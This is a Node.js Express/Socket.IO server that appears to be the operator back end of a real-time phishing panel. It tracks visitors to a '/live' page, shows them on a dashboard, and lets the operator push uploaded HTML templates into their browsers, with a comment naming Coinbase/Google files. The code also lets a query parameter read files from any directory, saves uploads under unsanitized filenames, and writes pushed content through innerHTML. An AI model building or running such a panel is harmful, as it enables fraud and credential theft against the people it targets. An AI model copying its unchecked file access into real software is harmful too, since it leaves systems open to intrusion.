// server.js
const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');

const upload = multer({ dest: 'templates/' });
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const PORT = 8080;
const connections = new Map();
let currentLiveTemplate = '<p>Default live page content</p>'; // Current live template

function getIpInfo(ip) {
  const countries = [
    { code: 'us', name: 'United States' },
    { code: 'gb', name: 'United Kingdom' },
    { code: 'de', name: 'Germany' },
    { code: 'fr', name: 'France' },
    { code: 'jp', name: 'Japan' },
    { code: 'in', name: 'India' },
  ];
  const c = countries[Math.floor(Math.random() * countries.length)];
  return {
    ip,
    isp: 'Dummy ISP Inc.',
    countryCode: c.code,
    countryName: c.name,
  };
}

// --- Middleware ---
app.use(express.static(path.join(__dirname, 'assets')));
app.use('/templates', express.static(path.join(__dirname, 'templates')));
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

// --- Dashboard ---
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'assets', 'index.html'));
});

// --- Live page ---
app.get('/live', (req, res) => {
  const ip = req.ip || '0.0.0.0';
  const info = getIpInfo(ip);
  const id = Date.now();
  connections.set(id, info);
  io.emit('new-connection', { ...info, id });

  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Live Page</title>
        <script src="/socket.io/socket.io.js"></script>
      </head>
      <body>
        <div id="live-container">${currentLiveTemplate}</div>
        <script>
          const socket = io();
          socket.on('update-live-template', content => {
            document.getElementById('live-container').innerHTML = content;
          });
        </script>
      </body>
    </html>
  `);
});

// --- Template upload API ---
app.post('/api/templates/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  const filename = req.file.originalname;
  const tempPath = req.file.path;
  const targetPath = path.join(__dirname, 'templates', filename);
  fs.renameSync(tempPath, targetPath);
  res.json({ filename });
});

// --- Send template to live ---
app.post('/api/live/send-template', (req, res) => {
  const { content } = req.body;
  if (!content) return res.status(400).json({ error: 'No content provided' });

  currentLiveTemplate = content;
  io.emit('update-live-template', content);
  res.json({ success: true });
});

// --- Serve Coinbase/Google files for dashboard ---
app.get('/api/files', (req, res) => {
  const folderPath = req.query.path;
  if (!folderPath || !fs.existsSync(folderPath)) return res.status(400).json({ files: [] });

  const files = fs.readdirSync(folderPath)
    .filter(f => f.endsWith('.html'))
    .map(f => ({
      name: f,
      content: fs.readFileSync(path.join(folderPath, f), 'utf8')
    }));

  res.json({ files });
});

app.get('/api/files', (req, res) => {
  const dirPath = req.query.path;

  if (!dirPath) return res.status(400).json({ error: 'Missing path query param' });

  fs.readdir(dirPath, (err, files) => {
    if (err) return res.status(500).json({ error: 'Cannot read directory' });

    // Only include .html files and read their content
    const htmlFiles = files
      .filter(f => f.endsWith('.html'))
      .map(f => {
        try {
          const content = fs.readFileSync(path.join(dirPath, f), 'utf-8');
          return { name: f, content };
        } catch {
          return null;
        }
      })
      .filter(Boolean);

    res.json({ files: htmlFiles });
  });
});


// --- Socket.IO ---
io.on('connection', socket => {
  socket.emit('all-connections', Array.from(connections.entries()).map(([id, data]) => ({ ...data, id })));
});

// --- Start server ---
server.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
